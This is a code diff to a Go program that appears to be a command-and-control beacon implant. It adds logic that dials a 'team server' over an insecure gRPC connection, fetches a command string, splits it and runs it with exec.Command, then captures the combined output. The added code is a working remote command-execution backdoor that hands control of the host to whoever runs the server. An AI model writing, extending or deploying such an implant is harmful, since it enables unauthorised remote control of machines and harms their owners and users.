@@ -5,6 +5,8 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"os/exec"
+	"strings"
 
 	"google.golang.org/grpc"
 )
@@ -19,21 +21,48 @@ func main() {
 		conn         *grpc.ClientConn
 		err          error
 		beaconClient grpcapi.BeaconClient
-		cmd          *grpcapi.Command
+		cmdline      *grpcapi.Command
 	)
+
+	// 1. connect to the team server
 	server := fmt.Sprintf("%s:%d", g_strTeamServer, g_nBeaconServerPort)
 	conn, err = grpc.Dial(server, grpc.WithInsecure())
 	if nil != err {
 		log.Fatalf("grpc.Dial error: %v", err)
 	}
+
+	// 2. init client
 	beaconClient = grpcapi.NewBeaconClient(conn)
 
 	// begin polling
-	ctx := context.Background()
+	context := context.Background()
 	req := new(grpcapi.Empty)
-	cmd, err = beaconClient.FetchCommand(ctx, req)
-	if err != nil {
-		log.Fatalf("could not greet: %v", err)
+	cmdline, err = beaconClient.FetchCommand(context, req)
+	{
+		if err != nil {
+			log.Fatalf("beaconClient.FetchCommand: %v", err)
+		}
+
+		if "" == cmdline.In {
+			// no work
+			log.Print("no work")
+		}
+		// execute the cmdline from team server
+		var cmd *exec.Cmd
+		cmds := strings.Split(cmdline.In, " ")
+		if 1 == len(cmds) {
+			cmd = exec.Command(cmds[0])
+		} else {
+			cmd = exec.Command(cmds[0], cmds[1:]...)
+		}
+
+		var arrBytesRes []byte
+		arrBytesRes, err = cmd.CombinedOutput()
+		if nil != err {
+			cmdline.Out = err.Error()
+		}
+		cmdline.Out += string(arrBytesRes)
+		log.Printf("response: %s", cmdline.Out)
+
 	}
-	log.Printf("response: %s", cmd.Out)
 }
